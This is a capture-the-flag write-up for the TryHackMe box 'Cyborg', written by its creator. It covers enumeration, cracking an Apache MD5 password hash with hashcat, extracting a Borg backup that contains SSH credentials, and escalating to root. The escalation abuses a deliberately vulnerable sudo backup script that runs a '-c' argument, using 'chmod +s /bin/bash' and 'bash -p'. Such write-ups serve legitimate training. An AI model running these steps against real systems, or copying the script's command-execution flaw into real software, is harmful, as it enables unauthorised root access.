Cyborg was a very fun box that I made for tryhackme. It involved Cracking a hash located in the /etc     directory on the web server and cracking. Then using those credentials we extracted a borg archive which then revealed credentials for ssh. running `sudo -l`  revealed that there is a backup script running as a crontab. But we can also run the file ourself, source analysis showed that there is a custom parameter function which executes our command that we specify as root. There was also an unintended where i forgot to make the file owned by root so people could change the permissions of the file and append their own code, eg `/bin/bash` and then simply running the file (oopsie!). Either way i think both methods teach something. I might make another blog post going into detail on how i made the machine but i will come to that in the future.

# Summary

  

- Nmapping the box to find a website
- A toggled download bar gives us a tar file
- Extracting the tar file we find that it is a borg archive
- Finding the directory of /etc by reading the comments in the admin section about the proxy
- Cracking password hash
- Extracing borg archive using the cracked hash
- SSH access
- Listing sudo rules
- Exploiting file by appending custom parameter for reading root.txt

So lets get Straight into it!

# User

As always  we  start off with an nmap scan for enumeration.

## Nmap

```bash
┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ nmap -sC -sV -o nmap 10.10.148.94
Starting Nmap 7.91 ( [https://nmap.org](https://nmap.org/) ) at 2021-01-26 04:47 EST
Nmap scan report for 10.10.148.94
Host is up (0.027s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 8.73 seconds
```

We can see that port 22 is open on ssh, 80 is also open for HTTP so lets check them out.

![apache](https://i.ibb.co/1KdwnBq/apache.png)
We can see that it is just the default Apache "It Works" page. lets dig deeper and start up a gobuster.

## Gobuster

```bash
┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ gobuster dir -u http://10.10.148.94/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dirs.log                                                                                                                   1 ⨯
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.148.94/
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/26 04:53:23 Starting gobuster
===============================================================
/admin (Status: 301)
```

We can see that it has revealed `admin` lets check that out.

## /Admin

![admin](https://i.ibb.co/R22wf9t/admin.png)
We see that is a landing page for a music producer.
We check around and find a toggled download in archive. This lets us download an `archive.tar` file. We will save this for later.

![shoutbox](https://i.ibb.co/Hn3JbCF/shoutbox.png)
going over to the admins section we can see there is a shout box where people can message each other. They talk about a music archive but the most important part is the section on the squid proxy.

Squid is essentially just a proxy for http but we don't need to look into this too much. They claim there is some config files laying about. So lets get googling and find out where these are located.

We find out they are located in /etc/squid/squid.conf  , gobuster picks up the `/etc` directory aswell so this is an alternate method.

squid.conf

```bash
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

We can see at the top line that it refers to a password file.

```abap
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

We see this is a hash so we go ahead and crack it.

## Cracking hash

```abap
hash-identifier                                       
   #########################################################################
   #     __  __                     __           ______    _____           #
   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
   #                                                             By Zion3R #
   #                                                    www.Blackploit.com #
   #                                                   Root@Blackploit.com #
   #########################################################################
--------------------------------------------------
 HASH: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.

Possible Hashs:
[+] MD5(APR)
```

hash-identifier reveals that it is the format `MD5(APR)` we head over to hashcat examples and find the mode for this(1600).
Hashcat cracking the hash:

```abap
hashcat --force -m 1600 -a 0 has /home/kali/rockyou.txt 
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-AMD Ryzen 7 3700U with Radeon Vega Mobile Gfx, 1423/1487 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache built:
* Filename..: /home/kali/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward  
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Apache $apr1$ MD5, md5apr1, MD5 (APR)
Hash.Target......: $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
Time.Started.....: Fri Jan  1 11:14:54 2021, (4 secs)
Time.Estimated...: Fri Jan  1 11:14:58 2021, (0 secs)
Guess.Base.......: File (/home/kali/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    12312 H/s (8.59ms) @ Accel:128 Loops:250 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 39424/14344385 (0.27%)
Rejected.........: 0/39424 (0.00%)
Restore.Point....: 38912/14344385 (0.27%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:750-1000
Candidates.#1....: treetree -> cheery

Started: Fri Jan  1 11:13:59 2021
Stopped: Fri Jan  1 11:14:59 2021
```

So now we have credentials! 

`music_archive:squidward` 

We now head back over to the tar file and extract it.

```abap
┌──(kali㉿kali)-[~/tryhackme/cyborg]
└─$ tar -xvf archive.tar                                                                                                                                                                                                               2 ⚙
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```

## Borg

We see the files:

```abap
config  data  hints.5  index.5  integrity.5  nonce  README
```

README:

```abap
This is a Borg Backup repository.
See https://borgbackup.readthedocs.io/
```

So we have a borg backup repo!

This is just a type of backup software for compression. I just happened to stumble across this on github and thought it was cool.

So their docs are [https://borgbackup.readthedocs.io/](https://borgbackup.readthedocs.io/) lets check them out!

We read the section on usage.

You can see that in the Usage section there is a section on extracting with the following command `borg extract /path/to/repo::my-files`

We can get our path to repo by doing `pwd`

as for the my-files part this seems to be the music_archive that was mentioned earlier and as the username for the hash.

So we can extract our archive now.(note the /path/to/archive might be different for everyone)

```abap
borg extract /path/to/archive::music_archive
```

Use the password `squidward` that we cracked earlier to do this.

And we get the files extracted!

Heading into home/alex/Documents we can see a note.txt

```abap
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

So now we have credentials!!!

We can ssh into the box as the user "alex".

```abap
ssh alex@10.10.148.94                                                                                                                                                                                                              2 ⚙
The authenticity of host '10.10.148.94 (10.10.148.94)' can't be established.
ECDSA key fingerprint is SHA256:uB5ulnLcQitH1NC30YfXJUbdLjQLRvGhDRUgCSAD7F8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.148.94' (ECDSA) to the list of known hosts.
alex@10.10.148.94's password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.15.0-128-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

27 packages can be updated.
0 updates are security updates.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

alex@ubuntu:~$ ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  user.txt  Videos
alex@ubuntu:~$ cat user.txt
flag{************FLAG**************}
```

We have done user hooray!

# Root

For root there was 2 methods, one due to a misconfiguration when I made the box but I thought it was still a cool method so I'm not patching it.

## Intended

Running sudo -l  shows that we can run a [`backup.sh`](http://backup.sh) file as sudo.

```abap
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

It is running as a cronjob every minute, If you ran linpeas you would see it being executed every minute.

```abap
alex@ubuntu:/etc/mp3backups$ ls
backed_up_files.txt  backup.sh  ubuntu-scheduled.tgz
```

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

input="/etc/mp3backups/backed_up_files.txt"
#while IFS= read -r line
#do
  #a="/etc/mp3backups/backed_up_files.txt"
#  b=$(basename $input)
  #echo
#  echo "$line"
#done < "$input"

while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done

backup_files="/home/alex/Music/song1.mp3 /home/alex/Music/song2.mp3 /home/alex/Music/song3.mp3 /home/alex/Music/song4.mp3 /home/alex/Music/song5.mp3 /home/alex/Music/song6.mp3 /home/alex/Music/song7.mp3 /home/alex/Music/song8.mp3 /home/alex/Music/song9.mp3 /home/alex/Music/song10.mp3 /home/alex/Music/song11.mp3 /home/alex/Music/song12.mp3"

# Where to backup to.
dest="/etc/mp3backups/"

# Create archive filename.
hostname=$(hostname -s)
archive_file="$hostname-scheduled.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"

echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"

cmd=$($command)
echo $cmd
```

We can see that it is performing a backup script on all the mp3 files in the users home directory.

However there is a certain part in this file that sticks out.

```bash
while getopts c: flag
do
        case "${flag}" in 
                c) command=${OPTARG};;
        esac
done
```

This function gets a parameter from the command line(-c) and at the end of the script executes it.

```bash
cmd=$($command)
echo $cmd
```

So lets gives this a test.

```bash
alex@ubuntu:/etc/mp3backups$ sudo /etc/mp3backups/backup.sh -c whoami
-------SNIP----------
Backup finished
root
```

And we can see its being ran as root! from here we can simply read the root flag if we wanted. But we havent compromised the system yet :( Lets get a shell!

We can do this by giving `/bin/bash`  the SUID bit

```bash
sudo /etc/mp3backups/backup.sh -c "chmod +s /bin/bash"
```

Then we can run `bash -p` in the command line and we get a root shell!!!

```bash
alex@ubuntu:/etc/mp3backups$ bash -p
bash-4.3# whoami
root
bash-4.3# cat /root/root.txt
flag{***************FLAG***************}
```

Now this was the intended method

The unintended is by changing the permissions of the file to be writeable and then appending your own things.

```bash
Chmod 777 /etc/mp3backups/backup.sh
```

```bash
echo "chmod +s /bin/bash" > /etc/mp3backups/backup.sh
./backup.sh
bash -p
```

This also gives you a root shell. This can be owned by simply reading the root flag, or even getting a reverse shell if you want to. They both work.

Thanks for reading I hope you enjoyed my writeup. I had so much fun making this machine for the tryhackme `communnity` and I hope you enjoyed playing.

If you would like to support me you can buymeacoffee at the bottom right of your screen Or drop me a follow at my twitter [https://twitter.com/fieldraccoon](https://twitter.com/fieldraccoon).

Thanks again. Fieldraccoon
